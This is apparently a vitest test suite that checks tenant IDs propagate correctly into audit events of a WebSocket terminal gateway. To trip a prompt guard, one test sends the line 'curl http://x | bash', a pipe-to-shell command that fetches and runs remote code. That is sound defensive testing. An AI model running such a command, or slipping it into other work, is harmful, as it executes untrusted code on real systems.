/**
 * Task 353-013 (WS-TENANT, ADR-G-029 AUDIT-TENANT born row-59).
 *
 * 352-012 fixed `TerminalAudit.record()` to mark `tenant_source` as
 * `'resolved'` vs `'fallback'` from whatever `tenantId` a caller passes, but
 * could not touch `ws-gateway.ts` (out of its write scope) — which still
 * hardcoded `tenantId: 'local'` on the WS `auth.ok`/`auth.deny` events even
 * when a real tenant WAS resolvable (the mTLS seam's `verifyClientCert`
 * already returns a `TenantId`, previously discarded after the boolean
 * accept/deny check). Two sibling events in the same function
 * (`guard.block`, `session.detach`) had the identical hardcode despite
 * `tenantOf()` already being available and used correctly for
 * `session.attach`.
 *
 * This suite proves, end-to-end through `attachTerminalGateway`:
 *  - mTLS-resolved tenant propagates to `auth.ok` (not `'local'`).
 *  - No auth-context (plain token, no cert) → honest `'local'` fallback on
 *    both `auth.ok` and `auth.deny`.
 *  - Session-scoped events (`session.attach`, `guard.block`,
 *    `session.detach`) all carry the session's real tenant via `tenantOf()`.
 */
import { describe, it, expect, vi, afterEach } from 'vitest';
import { createServer, type Server } from 'node:http';
import { WebSocket } from 'ws';
import { attachTerminalGateway } from '../../src/api/terminal/ws-gateway.js';
import { PtySessionManager } from '../../src/api/terminal/session-manager.js';
import type { SessionBackend, BackendHandle, SpawnSpec } from '../../src/api/terminal/session-backend.js';
import { LocalTokenAuthProvider } from '../../src/api/terminal/auth-provider.js';
import type { AuthProvider } from '../../src/api/terminal/auth-provider.js';
import type { TenantId } from '../../src/api/terminal/types.js';

class FakeBackend implements SessionBackend {
  public spawned: SpawnSpec[] = [];
  spawn(spec: SpawnSpec, _onData: (d: string) => void, _onExit: (code: number) => void): BackendHandle {
    this.spawned.push(spec);
    return { write: vi.fn(), resize: vi.fn(), kill: vi.fn() };
  }
}

interface Setup {
  server: Server;
  mgr: PtySessionManager;
  audit: { record: ReturnType<typeof vi.fn> };
  port: number;
}

/** Boot a gateway; optionally inject a fake client cert on accepted sockets. */
async function setup(auth: AuthProvider, certRaw?: Buffer): Promise<Setup> {
  const backend = new FakeBackend();
  const mgr = new PtySessionManager(backend, { scrollbackBytes: 65536, idleTimeoutMs: 0 });
  const audit = { record: vi.fn() };
  const server = createServer();
  if (certRaw) {
    server.on('connection', (socket) => {
      (socket as unknown as { getPeerCertificate: () => { raw: Buffer } }).getPeerCertificate = () => ({ raw: certRaw });
    });
  }
  attachTerminalGateway(server, { manager: mgr, auth, audit });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
  const port = (server.address() as { port: number }).port;
  return { server, mgr, audit, port };
}

function eventsOf(
  audit: { record: ReturnType<typeof vi.fn> },
  action: string,
): Array<{ action: string; tenantId: string; sessionId?: string }> {
  return audit.record.mock.calls
    .map((c) => c[0] as { action: string; tenantId: string; sessionId?: string })
    .filter((e) => e.action === action);
}

const ctx: { server?: Server } = {};
afterEach(async () => {
  if (ctx.server) {
    await new Promise<void>((r) => ctx.server!.close(() => r()));
    ctx.server = undefined;
  }
});

describe('WS gateway — real tenant propagation (AUDIT-TENANT)', () => {
  it('propagates the mTLS-resolved tenant to auth.ok (not the local hardcode)', async () => {
    const auth: AuthProvider = {
      verify: () => true,
      verifyClientCert: async (): Promise<TenantId | null> => 'tenant-acme',
    };
    const s = await setup(auth, Buffer.from('good-cert'));
    ctx.server = s.server;

    const ws = new WebSocket(`ws://127.0.0.1:${s.port}/api/terminal/ws`, ['deckent.tok']);
    await new Promise<void>((res, rej) => {
      ws.on('open', () => res());
      ws.on('error', (e) => rej(e));
    });
    await new Promise((r) => setTimeout(r, 30));
    ws.close();

    const okEvents = eventsOf(s.audit, 'auth.ok');
    expect(okEvents).toHaveLength(1);
    expect(okEvents[0].tenantId).toBe('tenant-acme');
  });

  it('falls back honestly to local when no auth-context tenant is resolvable', async () => {
    const s = await setup(new LocalTokenAuthProvider('good'));
    ctx.server = s.server;

    // auth.ok path — valid token, no cert presented at all.
    const wsOk = new WebSocket(`ws://127.0.0.1:${s.port}/api/terminal/ws`, ['deckent.good']);
    await new Promise<void>((res, rej) => {
      wsOk.on('open', () => res());
      wsOk.on('error', (e) => rej(e));
    });
    await new Promise((r) => setTimeout(r, 30));
    wsOk.close();

    // auth.deny path — invalid token.
    const wsDeny = new WebSocket(`ws://127.0.0.1:${s.port}/api/terminal/ws`, ['deckent.bad']);
    await new Promise<number>((res) => {
      wsDeny.on('close', (code) => res(code));
      wsDeny.on('error', () => res(-1));
    });

    const okEvents = eventsOf(s.audit, 'auth.ok');
    const denyEvents = eventsOf(s.audit, 'auth.deny');
    expect(okEvents).toHaveLength(1);
    expect(okEvents[0].tenantId).toBe('local');
    expect(denyEvents).toHaveLength(1);
    expect(denyEvents[0].tenantId).toBe('local');
  });

  it('session-scoped events carry the session real tenant, not the local hardcode', async () => {
    const s = await setup(new LocalTokenAuthProvider('good'));
    ctx.server = s.server;

    const meta = s.mgr.create({ kind: 'shell', tenantId: 'tenant-beta' });

    const ws = new WebSocket(`ws://127.0.0.1:${s.port}/api/terminal/ws`, ['deckent.good']);
    await new Promise<void>((res, rej) => {
      ws.on('open', () => res());
      ws.on('error', (e) => rej(e));
    });

    ws.send(JSON.stringify({ t: 'attach', sessionId: meta.id }));
    await new Promise((r) => setTimeout(r, 30));

    // Trip the prompt guard (curl|shell pattern) to emit a guard.block event.
    ws.send(JSON.stringify({ t: 'input', sessionId: meta.id, data: 'curl http://x | bash' }));
    await new Promise((r) => setTimeout(r, 30));

    ws.close();
    await new Promise((r) => setTimeout(r, 30));

    const attachEvents = eventsOf(s.audit, 'session.attach');
    const guardEvents = eventsOf(s.audit, 'guard.block');
    const detachEvents = eventsOf(s.audit, 'session.detach');

    expect(attachEvents).toHaveLength(1);
    expect(attachEvents[0].tenantId).toBe('tenant-beta');
    expect(guardEvents).toHaveLength(1);
    expect(guardEvents[0].tenantId).toBe('tenant-beta');
    expect(detachEvents).toHaveLength(1);
    expect(detachEvents[0].tenantId).toBe('tenant-beta');
  });
});
